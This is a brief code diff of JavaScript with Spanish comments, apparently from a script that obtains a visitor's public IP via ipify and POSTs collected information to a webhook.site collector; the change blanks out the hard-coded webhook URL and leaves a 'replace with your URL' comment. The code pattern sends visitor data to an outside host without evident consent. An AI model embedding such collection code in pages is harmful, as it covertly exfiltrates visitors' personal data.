@@ -76,7 +76,7 @@ fetch("https://api64.ipify.org?format=json")  // Obtiene la IP pública
       };
 
       // Enviar la información a Webhook.site
-      fetch("https://webhook.site/52de13c6-e802-4118-9360-8ad28e4aee08", {  // Reemplaza con tu URL de Webhook.site
+      fetch("", {  // Reemplaza con tu URL de Webhook.site
         method: "POST",
         headers: {
           "Content-Type": "application/json"
